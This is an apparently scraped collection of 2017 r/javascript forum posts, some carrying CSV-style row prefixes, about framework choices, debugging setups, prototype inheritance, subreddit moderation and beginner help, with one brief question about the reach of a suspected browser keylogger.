I think cookie theft and phishing are less likely, but the keylogging would concern me much more.

I understand that if this malicious code was active in your browser, the keylogging may be able to record any keys pressed 'in that tab of the browser' - but what I'd like to know, is can it also pick up keystrokes entered in another tab of the browser - or even offline such as in an excel file that was also open at the same time?",Possibly found a keylogger with javascript - question about browser tabs

""I think you really need to consider programming in a non-trivial system.""

This sentiment is simply a tired old slur employed by programming bigots. I know. I was one of them. I used to exist in bloated java land with immense hierarchies and simply judged JS as crappy mainly because it was just that. Total crap. But that's because I started in the 90s when it was crap so I simply presumed the lack of classes/interfaces/etc was all just a weakness by the poor programmers who made it and it lacked all the 'advanced features' I relied on every day to deliver real programs in real enterprise languages.

Then ES5 came out and V8 came out. I remained a bigot. Oh if you're making a 'real' system... then I started a job 5 or so years ago doing real javascript. Then I got into angular. And now? I look at that bloat every time I step back into java to support our legacy and feel the immense weight of it's technical debt on every task I need to do.

That's not to say there isn't a place for java, there is, but people have got to stop pretending that javascript it only used for micky mouse projects. It's not the same as java and it's loose typing is easily one  of it's most powerful features that immensely aids maintainability under changing requirements.

Typescript I'm sure has it's uses, but to me, it's biggest purpose is to simply provide a comfort zone to programmer who like me, were not comfortable accepting change and felt entitled to keep doing things the way they always did rather than learn something new.

The above is debatable and I fully acknowledge that. But the idea that ""if you designed non-trivial systems you'd know what I know"" is just a slur of a motif. I make non-trivial systems in javascript. Billions of dollars pass through them. They run huge institutions like hospitals. They run insurance companies and big data companies.

The above phrase is just a go to excuse people make to dismiss valid arguments against typing in JS and is categorically a veiled ad hominem attack against the person and not the argument taking a shot at their career assuming the bigot is just a higher class of programmer and if lowly dynamic typed people only were to work on real projects they'd understand.

It's a bunch of bullshit. It should stop.

872,2017-08-28 15:45:00,8,6,"Hey everyone,

I know my fair share of Javascript and would like to code up a pretty simple, multi-platform smartphone app as a hobby project. The only system functionalities I would need (and can think of right now) are:

* use the system clock
* be able to notify (vibrate/alarm/..)

So that sounds like a pretty good usecase for a javascript-based app. The problem is that there seem to be at least a dozen frameworks one can use and I feel in no position to judge which would be the best for me. Some quick research got me e.g.:

* Ionic
* NativeScript
* ReactNative

So maybe a couple of additional requirements for the framework:

* should use vanilla JS (not e.g. typescript)
* should have an S-shaped learning curve - i.e. doing simple things should be simple (I really don't want anything fancy in my app so I don't want to learn their entire UI philosophy first before I can create a simple view)
* should work flawlessly on linux and compile easily to both android and iOS

So if anyone who has some experience in that field could give me a couple of hints based on my requirements that would be great.

What I would like to do is create a UI for building a visualization UI.  For example, a user in a 'setup' mode would drag and drop components into specific locations on the screen and save the particular layout.  The same user could then restore that configured layout in a 'production' mode where the components would react to data updates in real time.  I believe I could easily do this in C# but I am just not sure what tools to look into for doing so in JavaScript.  I would prefer that the templates/components the user has access to in the 'setup' mode were dynamically populated from multiple servers.

I'm fine with Angular 4 and JavaScript for now, but it does get annoying trying to translate everything from the official documentation and community projects from TS into ES by hand. It gets lonely. Nobody is dumb enough to join me. [truth]

So I'm considering other options. Any suggestions? I am not sure if I'd like React, for various complex reasons. Some other frameworks I looked into just looked... clunky. Or half-baked. And each time I see jQuery I die inside a little. [truth]

I'm comfortable with writing ES6-only code, using ES6 modules (which work in practically all browsers now) and not even using rollup to uglify my files.

Hey guys and gals, simple question.  Let's say you have a document with a whole bunch (hundreds, let's say) of whatever's, nicely inside their divs or spans, and those spans or divs have some class.

For speed, how can you change the CSS for that whole class as a whole with a javascript function, WITHOUT iterating through every id?  I searched and even asked for people but all the answers I found involved iteration (applying it one at a time to each element).  I think it could be faster doing it for the class as a whole.

900,2017-09-09 09:24:56,11,2,"The 4 month project in question is a .NET (C# basically, maybe .NET Core) single page application, that will be used by big businesses to handle calls, mails, contacts etc. It will be ""cloud based"" or installed on premise (on a customer's server, of course).  Enterprise level stuff possibly. I will handle the frontend and the rest of the team will handle the backend (databases, freeswitch, crm stuff...). 

I would like this to be as simple as possible while using as fewest different libraries as possible. And do it quickly.

HTML, CSS, basic stuff: I will probably use Bootstrap 4 because it has bunch of documentation, it's popular and might save me time when handling different browsers, devices (this probably will not be an issue).  Users will use it on the desktop so that might bring using Bootstrap 4 in question as I don't need that much responsiveness - and then I would write just a couple of media queries for smaller or bigger screens...

Javascript framework/library: Now, what would be a quality selection to handle views? Long term support, simplicity, crystal clear licensing (MIT), good documentation and/or a lot of ready-to-use snippets are important.

* Angular is a complete MVC solution, and a complex beast, and using it just for views will add more unnecessary complexity which I definitely don't need. 

* React seems OK but has kinda scary licensing issues (FB keeps changing it, important!), and putting HTML in javascript with weird ""className"" for css classes is just ugly.

* Vue seems OK too, good documentation. Not very popular in big companies though (like mine), it's young and not supported by big companies (Angular- google, React- facebook), might overlap with jQuery (if I use Bootstrap 4, this might be a non-issue because they can live together but I hate using 2 different things to do one thing).

* jQuery would be already included in the project if I were to use Bootstrap 4, it has crazy amounts of snippets/solutions/examples written in it. But using it to write Single Page Application might be an issue as it's not designed to do this. It's designed to be a Swiss Army knife and to make small thing happen in the browser, not developing enterprise level, single page, professional applications. Lines and lines will be written to handle something that is done by two lines in some framework. And it might be less and less useful in the future because pure Javascript ES6 is taking over slowly.

* JavaScript ES6 - re-inventing the wheel over and over and over. Stackoverflow usually has answers for JS questions/problems written with jQuery, not vanilla JavaScript.

* Using only ASP.NET MVC solutions like ASP.NET Razor, SingulR etc and use jQuery to handle only Boostrap 4. Form what I gather it's all over the place, MS will drop the support for it the next day if they feel like it, MS put so many stuff in it it's ridiculous.

If you did not know, CrxOop brings (classical) object oriented programming to javascript and without requiring any external tools. It also brings what CrxOop calls POBP programming, which reflects the javascript prototype based programming.



Object oriented programming allows the code to properly document itself and enforce its intent. It protects future developers from deviating from the original intent of the code and causing damage. Further more it removes the need, and the associated code mess, of passing contexts around and trying to mimic one visibility or another. If you prefer prototype based programming, CrxOop's POBP implementation should provide similar benefits.

----------------
I spent the past 2 days banging my head against a wall trying to figure out how to parse data from a table written in  javascript that I scraped from a website. I started off trying to use regex which seems to be the first choice of most but I couldn't seem to get anything to work. Plus, I'll be pulling in a number of other, javascript tables from this site which are all different and so rather than create regex's for each I wanted to try to just have a universal parsing method. 

I'm still fairly new to python/programming and completely new to anything involving javascript so there's likely to be more efficient, more pythonic ways to go about all this but since I found a surprisingly sparse amount of straight-forward, up to date info on doing this and poor documentation/examples on how to use execjs, I figured I'd share the basic process I found to work. Some of the options I tried and wasn't able to get working without either a) moving my script from 3.x to 2.x or b) slowing down to the point of of unworkability:

- pyV8 (3.x = no bueno)
- pynarcissus (supposedly works in 3.x but like others, I couldn't get it import correctly)
- selenium (wayyy too slow)
- splash/scrapy (can't remember exactly but using splash was very complicated)

# The Results

It seems that a majority of you are in favor of removing a lot of help questions, with a minority who either want to remove everything or don't want to remove anything. 

# \/r/LearnJavascript

One of the top suggestions in the prior post was /r/LearnJavascript, and part of the reason for my delay is that once I realized we were going to be making some changes, I contacted the mods of \/r/LearnJavascript to make sure they were ok with the referrals...

&gt; We are happy to take all of this traffic! This is exactly what the sub is for!

&gt; Thanks for reaching out. - /u/kevinMrr

Which is awesome! /u/kevinMrr has done a lot for \/r/LearnJavascript, and I'm confident those we refer there will be in good hands.

# What makes a help question ""interesting""?

This topic is completely open to discussion; what makes a question interesting to you?

I've had a hard time coming up with litmus tests to identify the subjective determination of 'interesting' help questions -- _""I'll know it when I see it""_ is romantic, though opaque, and leaves a lot of room for inconsistent enforcement. 

# Dealing with the rest

Thankfully, I think it's a little easier to determine what's _uninteresting_.

Here's a sample of help questions I manually identified from a few days ago:

https://gist.github.com/anonymous/dfaf633e57ffba8a914c51aa753531d9

There's 18 there, and they comprised roughly 50% of the self posts for that day.

There are some basic autmod rules that would hit about 5-10% of those help questions, but the titles are so all over the place that simple regexes (_read: automod_) probably won't provide us the level of accuracy needed. Of course, if anyone has any ideas, then please speak up! Here's automod's [full documentation](https://www.reddit.com/wiki/automoderator/full-documentation) and subreddit: /r/AutoModerator.

Currently considering these as a start:
    
    ---
        title (regex): [""help"", ""which framework"", ""learn(ing)?""]
        type: submission
        action: filter
    ---
        domain: ""stackoverflow.com""
        action: filter
    ---
        
Note that items that are actioned `filter` are sent to the mod queue (aka. spam queue) to be approved before showing up in the subreddit.

I fully expect these rules to evolve as patterns are identified.

# We need your help!

However, in the mean time, we're going to need your help in a couple of ways.

* **The first way to help**, would be by doing your civic duty and **reporting posts that you believe belong in /r/LearnJavascript**. This is a fundamental right each of you has, and it's fully anonymous to us mods. We even have a fancy new report reason just for \/r/LearnJavascript referrals.

* **The second way to help**, for those of you wishing to heed the call to help steward /r/javascript, is to **apply to be a mod**. There's a reason that I'm choosing to not advertise it in the post title -- I want those of you who are genuinely involved in /r/javascript to be the ones to help out. Please see my stickied comment below to apply (closes midnight CST on 9/22)!

# In closing

I'd like to thank everyone for your input, your understanding, and your contributions to our community. I'm excited for the future of /r/javascript, and I hope you are too!

I'm looking for something that doesn't require editing the thousands of lines in this data block. Maybe I should just use the 1D array and multiply the Y position  by the width to give a single dimension position? (but this is thousands of multiplies every frame!)

Is using this the right way to go, or does ECMA Script 6 support something nicer?     
I could then do a nested x, y loop iterating through the 1D array and stick the values in the right element. It might be overkill and unnecessary though! I don't know...

 That being said though, I'm still a noob, and I'm spending my free time practicing and having fun with it. However, I've hit a wall in making a random encounter battle system. Basically, I have a class for describing all the values of an enemy.

    class Enemy 
        {
            public int enemVal;
            public string name;
            public string Chr;

            public int hpVal;
            public int maxHpVal;
            public int xpVal;
        }


And here is what a filled out enemy looks like~!

    //Enemies{
                    //Crow{
                Enemy crow = new Enemy();
                crow.enemVal = 1;
                crow.name = ""Crow"";
                crow.maxHpVal = 5;
                crow.hpVal = 5;
                crow.xpVal = crow.maxHpVal;
                    //}
                //}

Now, you see that ""enemVal"" int? I want each different type of enemy to have their own, unique ""enumVal"", and then have a random.next specified for each area in my game that can pull different enemies for battle. (that's not what I'm asking help for, I got that part covered).

What I am having trouble on however, is making a battle engine that can easily take the enemVal, and get corresponding info from it.. like, let's say it picks the enumVal of 1, then it can fill in the name of the enemy, the hp of the enemy, how much exp the player will get upon depleting the enemy's hp, etc.
(this is just a mock-up of what I mean)

    //Battle Engine: ""Hey Random, whats the enemVal?""
    //Random: ""1..""
    //Battle Engine: ""Alright.. let's see... First thing is...""
    
    Console.Write(enemy.name);
    
    /*Battle Engine: ""Alright! Since I know the enemVal is equal to 1, 
    I can find that the enemy.name is equal to 
    crow and tell the console that it should write crow!""*/

The message then says ""Touch screen to go fullscreen"", which is optional - the message disappears after 2 seconds.       

Touching the screen fires a click event that then calls the ""request fullscreen"" native function - which doesn't work without that user input.

This works on Edge, Chrome on Android, and PC, but the click event isn't firing on older iPhones. Nothing happens at least - I don't know how to debug javascript on iPhone either!

955,2017-09-30 02:43:25,67,17,"Hey guys.

So I've worked on CSS / jQuery for a couple of years, and within the past 2 years I've started to lead a team on a project with React, Redux, Javascript (ES6) and I feel like I'm ready to interview for a senior position. The only problem is, is it's unclear exactly what I'm required to know. I've never really needed to define constructors or classes for my code (outside of React classes) but in interviews I get questions about prototypes and classical inheritance but I never see anyone actually doing this type of code (again except React components) and usually when I do see it, it's clear a more functional approach would have worked a lot better.

So that's my question. How much OO am I expected to know? If I'm supposed to learn a good deal, are there any courses or books that walk through building something with them? I do see a lot of books that talk about Object Oriented programming but they go over the nuts and bolts like using defineProperty and how you can define properties to not be enumerable and just all this stuff I've never seen anyone actually do.

My other question, is how much of the DOM am I expected to know? Again I've mostly just used jQuery or React... I've never had a practical application to use javascript to grab and work with the DOM. I obviously know document.getElementByID, getElementByClass, and querySelector but again it's like... am I expected to know how to build jQuery?

Part of the problem is these jobs want expert Javascript developers but it's like... I'm not Dan Abramov or John Resig if that's what you're wondering. i'm very effective at what I do but there's so many parts of Javascript to be an expert in that it's really hard to tell exactly what I need to really firmly grok.",How much Object Oriented Programming am I expect to know for Senior Engineer positions?

In the past, before ES6 classes, I had the opportunity to apply a function that modifies an object's method's function. For example, it could find a signature of the original parameters, and provide that to the inner function as a parameter. Now that declaring classes of objects in ES6 has its own syntax, have I lost the means to carry out functional programming within the definitions of methods?

I previously used a system based on https://johnresig.com/blog/simple-javascript-inheritance/, and there was the opportunity to apply a function around the function definition of any method. Is there a syntactically sweet way of doing this that anyone here knows of?

It is pretty easy to get Visual Studio Code's (VSCs) debugger to work with the quick start program with the follow .vscode/launch.json file. I can select the ""Launch"" configuration, Debug-&gt;Start Debugging from the menu, and the app will start and stop at a breakpoint I set in main.js.

    {
        ""version"": ""0.2.0"",
        ""configurations"": [
            {
                ""name"": ""Launch"",

                ""request"": ""launch"",
                ""program"": ""${workspaceRoot}/main.js"",

                    ""."",
                    ""--enable-logging""
                ],

                ""outDir"": null
            }
        ]
    }
    
While there are a couple of issues with the tutorial, they are straightforward to figure out and I can use 'yarn start' from the command line to start the app and enable the developer tools in the electron window that appears.

However, I would like to be able to again use VSCs debugger to debug this app, but I am not certain what the launch.json file should look like so I can use the Launch configuration to launch the application.

The closest I've been able to come is with the following:

	{
		""version"": ""0.2.0"",
		""configurations"": [
			{
				""name"": ""Launch"",
				""type"": ""node"",
				""request"": ""launch"",
				""program"": ""${workspaceRoot}/node_modules/.bin/concurrently"",
				""stopOnEntry"": false,
				""args"": [ ""\""${workspaceRoot}/node_modules/.bin/babel-node server.js\"""", ""\""sleep 2 &amp;&amp; ${workspaceRoot}/node_modules/.bin/electron .\"""" ],
				""cwd"": ""${workspaceRoot}"",
				""runtimeExecutable"": null,
				""runtimeArgs"": [],
				""env"": {},
				""externalConsole"": false,
				""sourceMaps"": false,
				""outDir"": null
			},
			{
				""name"": ""Attach"",
				""type"": ""node"",
				""request"": ""attach"",
				""port"": 5858,
				""sourceMaps"": false,
				""outDir"": null
			}
		]
	}


It almost seems like it might work, but I get the following error when I use the Launch configuration with Debug-&gt;Start Debugging

	module.js:472 Uncaught Error: Cannot find module './bundle/renderer.bundle.js'
		at Module._resolveFilename (module.js:470:15)

To fix this issue, I am using the JS below, to collapse all of the nested nav items, and then with CSS I'm presenting plus signs for the user to click to open the collapsed nav items, and then an x to close them. 

Currently a user can open multiple nested nav items, which returns the same issue we were trying to avoid. To prevent this, we would like to auto-close any previously opened nested menus, when one is clicked. I found [this fiddle](https://jsfiddle.net/u0swbhc9/2/) that collapses opened lists, however I'm not exactly sure how to modify my JS below, in order to autocollapse the open navs.

    &lt;script type=""text/javascript""&gt;

        function setup_collapsible_submenus() {
            var $menu = $('#mobile_menu'),

                $(this).off('click');

                    $(this).attr('href', '#');
                }
              
                if ( ! $(this).siblings('.sub-menu').length ) {
                    $(this).on('click', function(event) {
                        $(this).parents('.mobile_nav').trigger('click');
                    });
                } else {
                    $(this).on('click', function(event) {
                        event.preventDefault();
                        $(this).parent().toggleClass('visible');
                    });
                }
            });

**Update:** Solution was adding this simple line to the else statement, that removes the .visible class from all sibling menus:

There are quite a lot of tutorials that give a short introduction to FP in JS, but they mostly just focus on using e.g., `map` instead of loops and some (fewer) also talk about currying and composition. 

What I can't find however are popular open source repositories that make heavy use of FP patterns in JS. I recently browsed lots of random repositories from people such as https://github.com/sindresorhus, https://github.com/maxogden or https://github.com/substack/ but they all use imperative, not-OOP-but-also-not-functional style which seems to be the most common style in JS land/. I guess that emulating true FP languages discourages people from contributing as it's so very foreign.

## gulp output without preset

I ran this a couple of times with similar timing results, ~1.4s;


## gulp output with preset ""env""

`[19:55:37] Finished 'js' after 2.46 s`

… which is a little too long for using it in our watch task.


**Now my question:** is that what I should have to expect from using preset-env or is there something wrong with my setup? I would like to convinve my colleagues to switch over to es6 syntax but if the build process wait is too annoying, I don't see it happening.

Is there a better way to transpile for older browsers using gulp?

I've been hearing about Angular4 and decided I should try it out, after all I feel like staying on top of new tech is part of the job. I followed the steps in the tutorial on the angular site, which told me to start from angular quickstart. I cloned the repo, ran npm install and was horrified.


My previously empty directory was now 121 MB project containing 13 thousand files and over 300 node modules. The quickstart project (which I'm lead to believe is basically 'hello world') had a src directory with 16 files. All this for an app that displays 'hello angular' in a browser window.


I ran create-react-app to see if this was just an angular issue, and that installed an astounding 890 node modules.


Am I alone in thinking this is kind of insane? Is this even JavaScript anymore? 


I have always treated libraries as tools, meaning I make sure I know what they do and how they work. But looking through the node modules in these newer, shinier frameworks is like reading an ingredients label. I have no idea what most of the libraries are, why I need them or if they're even used. What's 'brorand' or 'clap' or 'color'? Do I need them? I dunno but create-react-app installed them so I guess I'll keep them.


I feel like these frameworks are breeding a generation of developers that don't even *know* javascript, and that's a huge problem.


&lt;/rant&gt;


I'm interested in others opinions. At this point I can't even justify using react or angular 4, there's just too much overhead.


**Tl;Dr** I tried out angular 4 and was shocked at the amount of angular modules and boilerplate, ran create-react-app and was even more shocked.

Edit: Thanks for all the replies. I'm continuing to learn angular and the initial shock of *what the fuck is all this* is being replaced with the understanding that Angular/React/&lt;insert large framework here&gt; aren't really js libraries. They're development environments and languages all their own. You aren't writing JS, you're writing Angular, and that's OK.",Are frameworks getting a little out of hand?

YallaJS makes it easy to create HtmlTemplate and render it to DOM efficiently.

Motivation

yallajs has following main goals :

1. Highly efficient in DOM creation, updates and deletion.
2. Easy to use and very simple to understand
3. Using web standards instead of creating new ones
4. Very small size and no dependency.
5. Support ES 5 browsers suchas IE 9, IOS 6 and Android 5.

YallaJS is the missing piece library to build large project with native ES6 vanilajs. Heres a link of infamous Angular Hero Editor tutorial project, rewritten in YallaJS.

Performance :
YallaJS shows very promising performance, even yallajs is still in early stage to focus on performance, but the result shows yallajs wins over angular, react, and vue in terms of performance and memory footprint.

1066,2017-11-15 20:27:20,1,3,"Hello, here's my problem, and I'm wondering if Javascript can be a good solution.

Say I have an enormous amount of text, like from emails sent in, and in those are a bunch of URLs, of all different sorts.

I have a wide variety of different people, of different skillsets (and browsers), and spinning up a server to help with this is a bit of a non-starter.

So, I want to search this text. Grep isn't quite the right tool, python no one wants to install. Hmm. So I think to myself, well, they all have web browsers, Chrome or Firefox, so ... can I use Javascript to solve this problem?

What I want to do is done by many websites out there: you can find all URLs in text. BUT - I don't know if the data is sensitive, and I have to assume it is. 

Can Javascript search and find all the URLs in pasted text (or uploaded from a file), and keep it entirely local to a person's browser?

Anyone have any kind of sample code that does that? 

Not just highlighting, but some way to paste in text, press a button, and have URLs. Ideally URLs, domains, and the context around the URL all separate.

Is this possible, is Javascript a good choice for this problem? Or go use python, or go set up a web server (And then use Javascript) and have a CGI parse it all out?

I have something else where I've experimented with Excel and macros and I have about 3 different functions I've found or cobbled together and each one kind of does the job, if Javascript can't. Let me know if you need proof of work to see how those work.

Thanks for your opinions and experience. ",Question: making a client-side only piece of javascript that finds all URLs in cut and pasted text
1067,2017-11-15 20:38:40,1,2,"

I'm pretty new to ASP MVC (being more of a WinForm, WPF, and ASPX maintainer).

How would one do this in modern ASP MVC 5?

We have a Business, who can have many Contacts (friends, family, etc).

The user is on the CreateBusiness view, which has attributes for creating the Business
We want a button to present a modal dialog (via javascript) a new, small form for a Business to add contacts
Then, that modal dialog saves that item, and it is rendered back on the Business view.

Someone else on our team found this:
https://github.com/danludwig/BeginCollectionItem

But I don't like the heavy implementation details we still have to do. It also seems old being APS MVC 2 based.

Is there a modern alternative? Or should we write our own implementation which would largely by javascript AJAX based.

2) I want to know if you become a better JS programmer if you learn vanilla JS (or pure JS) like ""the old way of doing things"" before learning ES6+ or frameworks so you can fall back to vanilla JS and code everything by hand if the project need it etc.. is it like your a better C# programmer if you know how to code in C/C++ first and know your memory management etc does it work like that for JS ? you understand your stuffs before the syntax sugar etc

3) Which frameworks is the best ? React ? Angular2 ? Ember ? Whats the main differences between them, not just in syntax but in their philosophy ? Is it hard to learn a 2nd or a 3rd if your solid in just 1 ?

1076,2017-11-19 17:42:21,42,37,"Sorry if this has been asked recently, or seems too negative.  But that bright yellow banner is just too much for me.  I do like the way the yellow and brown contrast, that's something I picked up from the book ""Design for Non-designers"".  But I just think the exceedingly bright yellow should be limited to the logo in the upper right hand corner, and then a less intense yellow should be used for the rest of the banner, and again this is something I picked up the same book, using variations of a particular color.  

I guess the main drawback might be that it could then be harder to read the ""code"" that seems to be displayed in the banner, and maybe it isn't meant to be read per se, but it already hardly shows up, so could probably be done away with altogether, and/or have it's color changed (to some kind of light tan maybe, playing off the brown? -- EDIT: or if kept as white, to ensure it shows up somewhat against a lighter yellow background, make the font larger or weightier?).  And not to just seem like some kind of complainer, I'd be willing to give it a shot myself, but have never created a reddit banner, so guess I would need to do a little research.  If I were to undertake this myself, how would I get the current pages header style?

Further edit -- I have found at least where to read the current style sheet, and that is at: https://www.reddit.com/r/javascript/about/stylesheet/  The image is ""hard-coded"", or at least modifying an image is definitely outside of my purview -- I can handle some CSS, but have absolutely no experience manipulating images.  And that image is my only gripe, so unless someone else knows how and/or wants to try, I guess it remains as is.

For the last year and a half I have been developing an app using phoenix 1.2 and vanilla js for the frontend. As Phoenix uses brunch as default I started learning about the new JS world(ES5, ES6), so I started organizing my code in an View -&gt; Component -&gt; Connection.

The view declares the components that are going to be used, the components has their connection to the backend, leaving them with only one way of hydrating, so changes in the component data is getting a little difficult to adapt as requirement change. This is the result of me learning some JS concepts on the go.

I now have the opportunity to start the refactoring of the whole project. So that leaves, as for now, two options:

* Use the backend for rendering components, using something like  [this](https://robots.thoughtbot.com/how-we-replaced-react-with-phoenix), and then I dont know if its worth learning and using a JS Framework just to control the rendered behaviors of the pre-rendered components or go with vanilla js to accomplish this.
* Create two different projects, Phoenix API, vue frontend.

Right now Im leaning towards the first option as I think I can still learn more vanilla javascript concepts using this approach and because Elixir is fun to use, but this js framework and web apps done ""the right way"" world is just screaming at me telling me that I havent moved just because Im still living in dinosaurs time and cant begin to grasp the wonders of this new modern era.

So if you were a vanilla js developer who has found the truth in frameworks tell me what was it that enlightened you, or if you are an experienced vanilla js developer that can share its experience developing a whole framework please do.

I know that it always depends on my requirements and all that, but yes I could use a reactive frontend. Most of the views are updated via ajax through components I created.

I'm a fullstack js dev and I also like to spend a lot of time on my side projects.
I am familiar with most of the technology node and js has to offer today, emphasis on familiar, and I wanted to know if you guys could help me figure out the pros and cons of using Vue or Ember today (closing in on 2018). I chose Vue and Ember specifically because to me if you can't understand a technology from spending less than 5 minutes on the hello world and introduction part of the docs then (again, for me) this technology is flawed in its design (or its docs) and I don't want to invest too much time figuring out something I could do in half the time on another lib.

The way I see it Vue is way more modern and attempts to recreate the React experience but with native javascript and a way less crazy approach to doing stuff (than React). The main motto here is to have a ""reactive"" app that can be synchronized in real time with your data sources and update accordingly (as I understand it).

Now Ember is older but has something I absolutely love, a real ""design"" pattern behind everything they did on the lib, you have sane defaults, a great documentation and its simplicity and ergonomics make it a real pleasure to develop with. A major downside for me would be the weight and the speed of the library.

I don't really understand how both these libraries diverge so much that they are considered to be diametrical opposites, so if anyone could enlighten me, it would be great...",Vue or Ember in 2017-2018 ?

- Python source level debugging from minified JS files, setting breakpoints, inspecting variables etc.

But securing its place under the sun takes more than technical merits. Mindshare is very important for acceptance of Transcrypt as the tool to precompile Python to JS code. Googling for ""python javascript"", Transcrypt comes up high at page 1, googling for ""python browser"", Transcrypt comes up low at page 2. All in all this is a SE position many companies would kill for. Still there's room for improvement.

Anyone willing and able to help here?

Goal

Create a function that plays the following game: The computer picks a secret random integer between 1 and 100 (both inclusive), and repeatedly asks the user for guesses.
If the user's guess is too high or too low, the computer notifies them of that
Otherwise, if the user guesses the secret number correctly, the computer displays a winning message and the game is over.
Hint: See Math.random()

Stretch goal 1

If the user has not guessed the secret number in seven tries, the user loses.

Stretch goal 2

Validate the user's input. If the user puts a anything other than a number, tell the user they can only use numbers.
Hint: To create a number from a string in javascript use parseInt( ). See: Description.

Stretch goal 3

Allow the user to put their name in before the game starts. When the user has won the game, let the user know they have won, using their name.",Can anybody help me write this?

1117,2017-12-06 16:27:11,13,3,"In my understanding when using defer in a script tag which is placed right below a stylesheet, the browser waits for the stylesheet to load (CSSOM) before executing the script and firing DOMContentLoaded. [More about that](https://javascript.info/onload-ondomcontentloaded#domcontentloaded-and-styles)

This works in Firefox but not in Chrome, so I made a test case where a huge css file is loaded right before a script tag which is deferred. 

The HTML File with the stylesheet and the deferred script.

    &lt;!DOCTYPE html&gt;
    &lt;html&gt;
    &lt;head&gt;

        &lt;div class=""result""&gt;Loading...&lt;/div&gt;
    &lt;/body&gt;
    &lt;/html&gt;

The CSS file contains bootstrap and also a test-class which sets a font-family.

    /* ...bootstrap v4 css... */
    .test {
        font-family: 'It works!';
    }

The JS File contains jQuery and a simple test script.

    // ...jQuery....
    $(function () {
        $('&lt;meta class=""test""&gt;').appendTo(document.head);
        var extractedStyles = $('.test').css('font-family');
        $('.result').text(extractedStyles);
    });

In Firefox the CSS could be parsed on execution time and I see ""It works!"" [see Firefox](https://i.stack.imgur.com/ulPA3.png)

In Chrome the CSS could **not** be parsed on execution time and I see ""Times New Roman"" [see Chrome](https://i.stack.imgur.com/N6piE.png)

If you check the developer tools, DOMContentLoaded has been fired differently in Chrome and Firefox. 
Firefox fires it right at the end of load of the CSS file (which is why the testcase works) but Chrome doesn't wait for the CSS file to load.

I wanted to perform the exercise of porting this game to typescript. My assumption that I could do a build with typescript and run the output in a browser SIMPLY, has been shattered. I've been trying for several days and am about to give up. 

What I've tried: using commonjs, system, amd, and umd modules. These were all challenging because I was completely new to these modules and didn't know how to actually load the modules until recently (with systemjs). The whole time I've been using 'outFile' because a single file is attractive to me. 

So I just figured out how to load modules using systemjs, but I can't help but feel disappointed. It's too complex. I thought typescript compiled to plain javascript? Why must I use module loaders, etc. 

Also, I am reading that using outFile is bad (https://basarat.gitbooks.io/typescript/docs/tips/outFile.html). So I'm deflated that I have to go back to the drawing board again and work with many JS and bring in some app like browserify to make a single file.

1144,2017-12-19 00:04:48,2,0,"Okay, I read in a post about object oriented programming and alot of people seems to avoid prototypes altogether. That's not the way you should go guys, atleast get a basic understanding of the topic.

I thought maybe I'm able to explain it a bit better than some ressources out there, which to be honest, also confused me in the beginning. I'm really going to hold this really basic as I need to go to sleep soon and you can lookup on mdn for more information which explains this topic exhaustively. So let's start:

To begin with, I'm just going to define a simple constructor function.

    function Person(name, age) {
        this.name = name;
        this.age = age;
    }

Probably heard of that one, it's really not hard. Now I'm going to define a method with a prototype.

    Person.prototype.sayName = function() {
        console.log(""My name is "" + this.name);
    }

and now we need a person.

    var Billy = new Person(""Billy"", 155);

and when run the method that Billy has from the prototype, we get his name printed to the console:

    Billy.sayName();  // My name is Billy

Now you probably think ""good man, I was hoping for a explanation, I know all of this, it still confused me!""
I know, I've been there too, let me explain. When you create a function like this, or any function ever in javascript, a object is going to be created which holds some information from that function. Ever heard that functions are ""objects""? This is why:

 Basically it has 3 properties:
* name
* length
* prototype

for this particular function it looks like this:

    var Person = {
        name: ""Person"",
        length: 0,
        prototype: Person.prototype
    }

name and length is pretty self explanotory, but prototype might be not. And that's where I believe most of the time people get confused alot. But it's not, really. So you might question yourself what is the property pointing at with ""Person.prototype""? Well, funny enough it's another object that is created with the decleration of the function. so that means what?

imagine it like this:

    var Person.prototype = {
        constructor: Person
    }

It's just a object. What is that contructor property? It points back to the other object with the name, length and prototype properties. Don't ask me why that is, probably useful for making type checks to see which prototype belongs to which function.

So basically, 2 objects get created when a function is defined, one that holds 3 properties name, length and prototype, and another one which holds ""prototyped"" properties.

So what is the purpose of the ""Person.prototype"" object? Well it acts like a global object where all instantiated entities have access to the properties and methods of that object. for example:

    Person.prototype.sayName = function() {
        console.log(""My name is "" + this.name);
    }

What happens with that method? Well think simple with objects, you access the Person object, which holds the 3 properties name, length and prototype. Then you access the key name ""prototype"" inside of that object whose key value points to the ""Person.prototype"" object. So now your inside of that prototype object, and long behold you are going to define a method which is a function and it's name is ""sayName"". Sounds familiar? It's like you would create methods in normal objects you defined yourself. It's 100% the same thing.

So from this:

    var Person.prototype = {
        constructor: Person
    }

It becomes this:

    var Person.prototype = {
        constructor: Person,
        sayName: function() {
            console.log(""My name is "" + this.name);
        }
    }

I hope this makes it clear. So what does all of this mean now? Well when you define a entity like I did with billy:

    var Billy = new Person(""Billy"", 155);

Billy is basically just a object too with a property name and age, but at the same time there is a third property which points to the Person.prototype object. Here comes the prototype chain into play. Whenever something is requested from a object, like let's say the sayName method and it can't find it, it's going to look up in the next prototype that the object is linked to. So because this has a property which points to the Person.prototype object and that object has the sayName method, it's going to use that method because it found it there. Basically Javascript will look up in the prototype chain as far as possible to find a function or property that you requested. If it can't find any, it will throw a error.

That was my take, I'm certainly not the best explainer, I used to watch this [video](https://www.youtube.com/watch?time_continue=1474&amp;v=PMfcsYzj-9M) which helped me quite alot aswell as the tutorial on mdn about prototypes. Good luck!

I was thinking of making a firefox extension that involves inserting these types of links onto youtube pages, but I notice something: a ""regular"" TSL that is loaded when the page loads will not make the browser reload when it is clicked. It'll just scroll up to the player and go to the time. However, if you insert a link on your own after the page is loaded (which I tried through Inspect Element &gt; duplicate node on a link in FF), clicking that new link will make the entire page refresh and go to the time (which is now in the URL). I don't want that. I was basically wondering how I could make a new TSL work the same way as an old one. Here's an example.

So I'm having a bit of a problem with sending, and reading json objects.

so: I have basic API server on raspberry pi

*[I followed this tutorial, to build API (index, client, api etc..)](http://www.robert-drummond.com/2013/05/08/how-to-build-a-restful-web-api-on-a-raspberry-pi-in-javascript-2/)*

so, as you can see I'm using ""express"" package..

Now, I can do with GPIO pins whatever I want, and I can post objects to url.. for example I have inputs object and I'm posting it to some url, which is local ip from pi port 3000/inputs.

&amp;nbsp;

Now the problem:

I can read objects in client.js perfectly (*[code from client.js - line 44 to 66](https://drive.google.com/file/d/1jf8nOm7rcFB44te3xVUEN1oTDVaZnHk9/view)*)

but [as you can see here](https://drive.google.com/file/d/1FJBaySWBB_4DD4XlDQIqT20kVooyVXO4/view), PUT doesn't go trough..

it says:

